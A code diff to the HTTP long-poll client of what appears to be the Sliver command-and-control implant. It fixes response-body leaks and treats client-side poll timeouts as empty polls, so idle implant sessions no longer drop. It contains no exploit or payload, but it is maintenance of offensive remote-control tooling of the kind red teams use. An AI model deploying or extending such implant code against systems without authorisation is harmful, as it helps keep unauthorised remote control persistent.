@@ -350,34 +350,54 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 		s.pollMutex.Unlock()
 	}()
 
-	done := make(chan error)
+	done := make(chan error, 1)
 	var resp *http.Response
 	var data []byte
 	var err error
 	go func() {
 		resp, err = s.driver.Do(req.WithContext(ctx))
-		select {
-		case <-ctx.Done():
-			done <- ctx.Err()
-		case <-time.After(s.Options.PollTimeout):
-			// {{if .Config.Debug}}
-			log.Printf("[http] poll timeout error!")
-			// {{end}}
-			done <- http.ErrHandlerTimeout
-		default:
-			if err == nil && resp != nil {
+		// 无论如何都要关掉响应体,避免取消/超时时泄漏连接。
+		if resp != nil && resp.Body != nil {
+			if err == nil {
 				data, err = io.ReadAll(resp.Body)
-				defer resp.Body.Close()
+			}
+			resp.Body.Close()
+		}
+		if err != nil {
+			if ctx.Err() != nil {
+				// 会话被主动关闭/取消
+				done <- err
+				return
+			}
+			if isTransientPollTimeout(err) {
+				// 长轮询未在客户端超时内返回:按“空轮询”处理。
+				// 否则每次长轮询超时都会累积 errCount,最终把整条会话拆掉
+				// (表现为空闲一段时间就掉线)。
+				// {{if .Config.Debug}}
+				log.Printf("[http] poll timeout, treated as empty poll")
+				// {{end}}
+				resp = nil
+				data = nil
+				done <- nil
+				return
 			}
 			// {{if .Config.Debug}}
-			if err != nil {
-				log.Printf("[http] poll failed to read all response: %s", err)
-			}
+			log.Printf("[http] poll failed: %s", err)
 			// {{end}}
-			done <- err
 		}
+		done <- err
 	}()
 	return resp, data, <-done
+}
+
+// isTransientPollTimeout - (客户端侧)轮询超时判定。标准库的超时错误都会实现
+// net.Error.Timeout();同时兼容 context/http 的哨兵错误。
+func isTransientPollTimeout(err error) bool {
+	var te interface{ Timeout() bool }
+	if errors.As(err, &te) && te.Timeout() {
+		return true
+	}
+	return errors.Is(err, context.DeadlineExceeded) || errors.Is(err, http.ErrHandlerTimeout)
 }
 
 // We do our own POST here because the server doesn't have the
